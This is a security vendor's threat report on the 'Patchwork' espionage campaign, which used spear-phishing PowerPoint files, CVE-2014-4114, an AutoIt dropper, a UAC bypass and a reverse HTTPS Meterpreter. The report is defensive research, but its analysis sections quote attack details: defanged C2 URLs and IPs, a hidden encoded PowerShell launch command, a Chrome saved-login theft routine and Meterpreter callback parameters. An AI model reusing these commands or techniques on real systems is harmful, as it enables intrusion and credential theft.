EXECUTIVE SUMMARY 

Patchwork is a targeted attack that has infected an estimated 2,500 machines since it was first 
observed in December 2015. There are indications of activity as early as 2014, but Cymmetria has 
not observed any such activity first hand. 

Patchwork targets were chosen worldwide with a focus on personnel working on military and 
political assignments, and specifically those working on issues relating to Southeast Asia and the 
South China Sea. Many of the targets were governments and government-related organizations. 

What makes this report special is that Patchwork is the first targeted threat captured using a 
commercial deception product. Through the use of deception campaigns created with 
Cymmetria’s MazeRunner, we were able to catch the threat actor’s second stage toolset, as well 
as lateral movement activity. 

 
The code used by this threat actor is copy-
 
pasted from various online forums, in a way 
 
that reminds us of a patchwork quilt – hence 
 
the name we’ve given the operation. 
 
 
In active victim systems, Patchwork 
 
immediately searches for and uploads 
 
documents to their C&C, and only if the 
target is deemed valuable enough, proceeds 
 
to install a more advanced second stage 
 
malware. 
 
 
It is impossible to reach clear attribution 
 
from the information available. We have 
 
included an attribution section in this 
 
document to document our research efforts 
in this regard.

THE INVESTIGATION 
OVERVIEW 
The attack was detected as part of a spear phishing against a government organization in Europe 
in late May 2016. The target was an employee working on Chinese policy research and the attack 
vector was a PowerPoint presentation file. The content of the presentation was on issues relating 
to Chinese activity in the South China Sea.

After the presentation is opened, the vulnerability highlighted by CVE-2014-4114 is exploited. 
This is a well documented vulnerability commonly called Sandworm, which only works on 
unpatched versions of Microsoft Office PowerPoint 2003 and 2007. 

Once the exploit worked, it deployed the first stage payload: a compiled AutoIt script. This script 
then bypassed UAC using a known method called UACME, the code for which was taken from an 
online forum.

TLP: GREEN 

With higher privileges, the first stage payload ran PowerSploit to download code to run a reverse 
shell with Meterpreter – the RAT of the well known MetaSploit framework. 

The next stage was exfiltration of document files that are also used to validate the value of the 
infection. If the infected system was deemed valuable enough, the threat actor then infected the 
target host with a second stage payload, which was once again a module built from code taken 
from various online forums and resources. 
 

 

 

 

 

 

 

 

 

 

 

 

 

Flowchart of infection stages 

 

Since the threat had already been detected and stopped, our goal was to discover as much as we 
could about the threat actor. Specifically, we were interested in tools, techniques, and 
procedures (TTPs), so that we would be able to detect the threat in case it succeeded in gaining a 
foothold elsewhere in customers’ assets. Learning about the threat actor’s TTPs would also allow 
us to prevent the threat actor from launching another operation targeted at our customer, as 
well as prevent them from launching similar attacks against other customers in the future. 

Our investigation proceeded on two fronts: 

1. We built a deception campaign to discover the second stage malware and the actor’s TTPs, 

while the operation was still active. 

2. We investigated the operation to uncover the threat actor’s capabilities. 

 

HUNTING THE ATTACKER WITH A DECEPTION CAMPAIGN 
In order to capture the attacker’s second stage malware (persistence) and observe their pivoting 
behavior in the network (lateral movement), we created a realistic environment in which to hunt 
the threat actor. We did so by using Cymmetria's MazeRunner solution to deploy a deception 
campaign. A deception campaign is essentially a story comprised of breadcrumbs and decoys; it 
leads attackers to believe that they have successfully gained access to a target machine. 

Breadcrumbs are pieces of data that lead an attacker to another machine; these could be stored 
credentials, open shares, browser cookies, VPN configurations, and more. Decoys are full 
operating systems running on virtual machines that act as real and high-value targets for an 
attacker; breadcrumbs point to decoys, which are fully monitored for any attacker interaction.

TLP: GREEN 

The campaign (which can be found on Cymmetria Research’s GitHub) was built to fit the specific 
profile of the active target. MazeRunner captured all the forensic data associated with the threat, 
so we knew that the threat actor followed the breadcrumbs and activated all the stages of their 
attack. MazeRunner allowed us to see all of the network traffic, operating system changes, and 
lateral movement the threat actor performed.  

This is the first time, to our knowledge, that an APT (or more aptly, a targeted attack) has been 
deceived and captured by a deception solution that caused the threat actor to follow 
breadcrumbs and attack decoys, ultimately leading to the disclosure of the operation. 

 

 

 

 

 

 

 

 

 

 

The deception campaign that caught the APT 

GETTING STARTED 
As mentioned in the previous section, our first order of business was verifying that the operation 
was still active, and then creating a deception campaign around it to catch the second stage 
malware and discover and mitigate other TTPs being used by the threat actor. To this end, we 
created a target in the form of a profile for a person in whom the threat actor was interested. We 
then constructed a deception campaign based on that profile. In this case, the person was a 
member of a government think tank dealing with security issues. 

A network around the infected endpoint was created using MazeRunner: 

• SMB shares were created on decoys, and mapped on the target laptop, to play the part of 

network backups. 

• Further, RDP credentials were deployed on the laptop to lead to a service running on a decoy 

system in the cloud.

CHAIN OF EVENTS 
1. The PowerPoint PPS file was opened, which in turn dropped the initial payload components. 

The exploit used was CVE-2014-4114 (Sandworm). 

 
               

 

 

 

 

 

1.

   

Driver.inf content 

2. The endpoint was infected with the following executables: 

•

•

sysvolinfo.exe – AutoIt compiled script. 

PowerShell reverse shell HTTPS Meterpreter script – Was pulled from the C2 server 
and was executed using the following requests: 

•

•

212[.]129.13.110/dropper.php?profile=<base64 of 
[username@computername]> 

hxxps://45[.]43.192.172:8443/OxGN  

3. Files from the target laptop were being uploaded by the threat actor to the control server, 

alongside significant activity on the encryption channel. We did not monitor the SSL encrypted 
channel, in order to avoid detection in case Meterpreter’s “sstagerverifysslcert” 
option was used. 

4. The threat actor decided to drop the second stage malware, 7zip.exe, onto the infected 

endpoint. The tool scanned the hard disk, and talked with its C&C. 

5.

It copied itself as netvmon.exe into C:\Windows\SysWOW64\netvmon.exe and added 
that path to the startup programs. This is how the threat actor achieves persistence.

TLP: GREEN 

 
 

6. Three days following the initial infection, alerts were received on the decoy running the SMB 

shared folder indicating access by the threat actor. 

7. The malware accessed the mapped share that was deployed as a breadcrumb on the infected 

laptop while scanning all the drives for files. The actual function that caused the alert was 
GetDriveTypeA (which is called to assure that only fixed drives are traversed). 

8. After the first alerts in the system were generated, we saw connection attempts to our cloud 
decoy via RDP. This decoy’s IP address was placed as an RDP credentials breadcrumb on the 
target laptop. The alerts originated from 212[.]129.7.146, and the entire event lasted for 
12 minutes. 

9.

 The alerts we received in MazeRunner indicated that the attackers failed to log in several 
times, which makes us believe that they pulled the RDP connection file (breadcrumb) that was 
on the infected desktop. It is interesting to note that they didn’t mine the credentials using 
mimikatz (which would have enabled them to connect to the cloud decoy with ease). 

10.  We believe this connection was carried out by the same threat actor because: 

• The IP they used to connect to our decoy also belongs to rev.poneytelecom.eu. 

• The event took place on the same day we received the alerts on our internal system.  

This shows that the threat actor was deceived into exfiltrating data, deploying their second 
stage persistence tool, and using the breadcrumbs that we left on the infected laptop. 
Furthermore, if they had used mimikatz, they also would have succeeded in connecting to our 
cloud decoy and be encouraged to deploy other, later stage tools.

INTELLIGENCE GAINED FROM THE ACTOR’S C&C SERVER 
Through one of our partners, we managed to receive access to one of the threat actor’s 
command and control servers. The server contained a multitude of additional files: 

• An abundance of PPS files – the spear phishing infecting files 

• Additional malicious code packages 

Most of the spear phishing files’ content2 was directly related to China-related subjects, or 
pornographic in nature. Some examples of the spear phishing PPS attachment files used by the 
threat actor: 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 
From the C&C server, we also extracted the dates on which the PPS lures were last modified; 
these dates ranged from December 2015 to January 2016. The dates were grouped together and 
then plotted. The resulting graph is a good indication of times at which we believe the attackers 
prepared and carried out their attack.

Flowchart of infection stages 

 

The attack vector is a spear phishing email with a PPS file attachment. It utilizes the exploit of 
CVE-2014-4114 (Sandworm). The exploit code closely resembles a public proof of concept exploit 
found on exploit-db1³. The exploit enables the attacker to drop files and execute an INF file, 
which is a Windows driver descriptor file. 

 

Through the exploit, the attack drops two files that are embedded in an OLE object to the local 
machine: 

• Driver.inf 

• Sysvolinfo.exe 

 
 

 

 

 

 

 

 

Driver.inf content 

After dropping the files, the exploit executes the INF file by calling the Windows utility 
InfDefaultInstall.exe with the dropped driver.inf as a parameter. 

This causes the execution of the Windows utility RunOnce.exe, which receives the 
sysvolinfo.exe file as a parameter and executes it.

DROPPER 

The sysvolinfo.exe is the first stage payload of the threat actor (another name seen is 
uplv1032.exe). Its purpose is to escalate privileges, exfiltrate data, and download and execute 
an online remote access tool based on PowerSploit⁴. Through the now installed Meterpreter, the 
actor can issue commands to run on the infected machine manually. 

 

 

 

 

 

 

 

 
 

 

Originally created by an unknown user of “O RLY Cover Generator”5 

The sysvolinfo.exe code itself is a compiled AutoIt script. A significant portion of its code is 
copied from the online hacking forum “Indetectables”6. 

 

C&C COMMUNICATIONS 

Once the tool starts, its first action is to connect back to the C&C server and send a beacon, 
listening for commands. Below is the analysis of the C&C protocol. 

Definitions: 

 

 

 

 

 

 
 
 

 

 

ComputerID = BASE64ENCODE(“$USERNAME@$COMPUTERNAME”) 

ddager = Is startup registry key added (Bool)

 Which is sent with the following parameters:  

- ddager, r1, r2, r3, r4, r5, r6.  

The return value of the request is structured as follows:

Command explanation 

The debug print describes the command as "[+] ServFlag  :

If command “2” wasn’t called before, then execute a PowerShell script with 
the UAC bypass vulnerability: "powershell -nop -wind hidden -noni 
-enc " & $PAYLOAD 

Reset the inner state of the script to ignore previous execution of command 
“2”, thus allowing command “2” to execute again. 

Exit the script.

Functions: 

_emorhc($dllurl) – Searches for sqlite3.dll (or sqlite3_x64.dll in 64 bit). If not 
found, it downloads it from $dllurl. The function then proceeds to close all the “chrome.exe” 
processes, dump the login data database @USERPROFILEDIR & 
"\AppData\Local\Google\Chrome\User Data\Default\Login Data" 
into  C:\recoveryx\Protected.ie2, upload the file, and delete it. Note: the authors forgot to 
delete the c:\recoveryx directory. 

_getnewver($newverurl) – Deletes itself, downloads a new version from $newverurl, and 
executes it. Cmd command: 
 

“cmd.exe /c ping -n 5 127.0.0.1 > nul & del " & @SCRIPTFULLPATH & " & ping -n

_instcust($custurl) – Downloads a “custom” executable and executes it with the UAC 
bypass vulnerability. 

_upload($f_path, $f_name, $repeat, $retry) – Handles all file upload. It uploads the 
file $f_path to hxxp://212[.]129.13.110/update-request.php?profile= + 
$ComputerID, with a maximum retry count of 5. The post contains the following data: 

 
"Content-Disposition: form-data; name=""filename""; filename=""" & 
$f_name & "|" & $f_hash & """" & @CRLF & @CRLF & $ffile & @CRLF  

 
Where $f_hash is the md5 cheksum of the file to be uploaded, $f_name is the base64 
encoding of $f_name, and  $ffile is the content of the file. 

After sending beacon to the server, it continues to scan the “Program Files” directories (both x86 
and the standard path) for a directory with the string “Total Security” (the installation path of the 
“360 Total Security”7 antivirus), and oddly, proceeds to do nothing with that knowledge. 

The payload will install itself in the startup programs folder as "Baidu Software Update" 
(HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run). It then 
sends another beacon to the server, after which it starts to recursively go over all of the fixed 
drives in the computer and look for files with the following extensions: 

• doc 

• pdf 

• csv 

• ppt 

• docx 

• pst 

• xls 

• xlsx

It then uploads all of the files to the server at:

PRIVILEGE ESCALATION 

After the previous stages, the payload uses a well known and as-of-yet unpatched UAC bypass 
vulnerability in Microsoft Windows (known as UACME8), which works on the default setup of 
Windows 79. This allows the attackers to execute commands as Administrator. 

If the AutoIt script is compiled for x86 systems (/x86 flag), the payload hides the UAC bypass 
vulnerability exploitation inside svchost.exe using a technique called Process Hollowing10 (UAC 
bypass method – ‘IFileOperation COM Object’11). If the AutoIt script is compiled for x64 systems 
(/x64 flag), the oobe12 UAC bypass method is used.

SHELLCODE EXECUTION 

When the AutoIt malware’s heartbeat receives a “2” in $sdata (this seems to be the most 
common scenario), the included, base64-encoded response data is decoded and executed using 
the command “powershell -nop -wind hidden -noni -enc”. We observed that the 
base64-encoded payload was a PowerShell script that closely resembled code designed to allow 
x86 shellcode to run on x64 architectures13. This PowerShell script executed an additional 
payload, which was a PowerSploit script14 used to invoke shellcode containing a reverse HTTPS 
Meterpreter. 

 

REVERSE HTTPS METERPRETER 

The AutoIt script escalates privileges and then executes a PowerShell script that is easily 
fingerprinted as a reverse HTTPS Meterpreter. It seems likely that the PowerShell scripts were 
copied from an online blog15, and the Meterpreter payload inside was generated using the 
parameters: 

• LHOST=45[.]43.192.172 

• LPORT=8443

Hex view of the 7zip.exe memory dump 

Most of this payload’s code is based on a public online code project in GitHub16. 

 

Once unpacked, the module performs these actions: 

•

In order to persist past computer shutdown and power on, the payload copies itself to a 
system directory, renames the file to netmon.exe, and adds the executable to the startup 
programs as “Net Monitor”: 

C:\Windows\SysWOW64\netmon.exe - example of the final destination on 64-bit 
system running 7zip.exe/netmon.exe via WOW64 

• One thread scans all drive letters and exfiltrates files with certain extensions in the permanent 

drives (not searching network drives or USB). 

Note: this is called the GetDriveTypeA function in kernel32.dll, which caused the alert 
on our system. 

• Another thread is uploading files of the same formats as from the Dropper payload (see above) 

to hxxp://../http/up.php. 

• Another thread downloads an executable from hxxp://…/http/down.php and executes it. 

We didn’t observe this behavior.

Many of the primary targets of this campaign are regional neighbors of India, and other targets 
seem to be targeted (by their interests, occupation, and by the content of the spear phishing) to 
issues affecting India. Circumstantially, this targeting correlates with intelligence requirements 
necessary for a pro-Indian entity. 

However, we felt this was not enough to draw direct conclusions. What we believe makes this 
correlation much stronger and hints that this is a pro-Indian or Indian entity, is the addition of 
time of day activity analysis as detailed below. 

 
PPS EDIT TIME ANALYSIS17 
Following a review of the PPS files found on the C&C server, we extracted data concerning the 
time of day when each PPS file was last modified, and plotted this on a graph. Below, we can see 
that more editing occurred during certain hours of the day.

17 Time zone analysis and research activity associated with daytime hours is circumstantial by definition. 
Some threat actors work around the clock, and manipulation of timestamps has been seen in past attacks 
by various threat actors. While it should be treated with due suspicion, it has also proven itself highly 
valuable in analysis of APT threat actors in the past and cannot be discounted.

Based on modification times of the infecting presentation files, we see two distinct batches of 
work. The first, where the bulk of changes has been made, stretches from around 4:00am to 
12:00pm in coordinated universal time. To visualize what exactly that means, this time range was 
considered in the context of a standard 9:00am – 7:00pm work day and applied to a map. The 
“First stretch of work” label on the map below depicts the areas of the world in which 4:00am - 
12:00pm UTC would fall within the standard work day. Similarly, the time zones shaded within 
the “Second stretch of work” area are representative of the areas of the world in which 7:00pm - 
10:00pm UTC falls within the work day. Since the time span of the second stretch of work is 
smaller in range, the hours in universal time fall within the working hours of more countries. 
Based on this map, we can conclude that it is most likely that the threat actors were based within 
the blue areas.

the previous PPS data.

C&C ACTIVITY TIMES 
The time at which servers were staged was listed not only by hour, but by day of the week. After 
plotting these times by hour, with the day of the week specified through color coordination, we 
can see various patterns. It was more common for servers to be staged on certain days of the 
week, such as Sunday, rather than on other days, such as Saturday. These times are also 
clustered together in a clump for the most part, with almost no activity earlier than 2:00am UTC, 
and besides one exception on Sunday, not later than 11:00am UTC. This clump is very similar to 
the range of time specified within the first clump of time in the PPS editing graph and the “First 
stretch of work” area of the “Threat actor working hours” diagram.

Other data extracted from the server included the time of day and day of the week of domain 
registrations. After plotting these on a graph, we observed that domains were registered only on 
specific days of the week. The other important feature is that all of these incidents occurred 
between 3:00am and 3:00pm UTC, which is a slightly wider range than the first stretch of time in 
the PPS editing graph, but still very comparable.

Extra analysis we were able to conduct was on the compilation times, by time of day and day of 
the week. After plotting these on a graph, we observed that, similar to domain registrations, 
compilations only occurred on specific days of the week. All the events took place between 
2:00am and 10:00am UTC, which is only a slight shift of the time span in the first stretch of PPS 
editing.

All three of these graphs provide confirmation that these attacks were clustered partially by day 
of the week but mostly by time of day. Specifically, the time of day when staging servers, domain 
registration, and compilations occurred most frequently lined up with the first stretch of time 
seen in the PPS18 editing data. This applies to the area of the map within the “First stretch of 
time” label and adds weight to our conclusion that the threat actors live in the blue area. 

This time of day activity data, when combined with the previous circumstantial evidence (the 
threat actor’s intelligence requirements, the countries targeted around India, the other targets 
around the world, and the content of the spear phishing), directs us to the conclusion that this 
threat actor correlates with a location in India. 

Carefully, we feel obligated to note that further evidence suggests potential links between this 
threat actor and the operations known as Hangover/Appin, but this possible link is still being 
researched and is far from conclusive. 

That said, attribution is tricky business and it’s never possible to be entirely conclusive.

repurposed for spear phishing purposes also contain language indicators that support our 
hypothesis, but we have no direct information to support this.

CONCLUSIONS 

Patchwork is a highly successful targeted attack operation, infecting approximately 2,500 high-
value targets worldwide. It is surprising that it has remained undetected since its operations 
began in December, as it seems to have been built out of a confluence of code taken from 
various public and hidden criminal forums, as well as various open source projects. 

What makes this disclosure special is the use of Cymmetria’s cyber deception platform19 to catch 
the threat actor, capturing their second stage toolset and lateral movement activity. Without 
deception, capturing second-stage tools and activity has previously been difficult (to say the 
least). 

The high degree of operational capacity stands in stark contradiction to the low technical ability 
displayed, which raises the question of whether the copy-paste nature of the threat was 
potentially intentional, perhaps an evolution of threat actors attempting to avoid the high cost of 
losing their expensive tool box and malware when they are eventually publically disclosed. This, 
however, seems unlikely, as the use of such second-hand code is consistent with their second 
stage toolset meant for persistence, which should typically be built to resist detection. 

While one can almost never be conclusive in attribution, based on the information we have it is 
plausible that the threat actor is a pro-Indian one. As our CEO Gadi Evron said in an internal 
discussion, “There is a possibility that another threat actor wanted to look like India and built a 
false flag operation to fit, but there is zero evidence to support that claim, and it feels like we’re 
reaching just to attack our own argument.” 

Unlike other APT threat actors, India seems to be a relatively quiet locale for cyber espionage 
activity, if indeed this is a pro-Indian threat actor, it is noteworthy by itself. The scope and scale 
of this operation are quite surprising considering the low technical capability displayed, which we 
believe is a growing trend seen among disparate  threat actors.
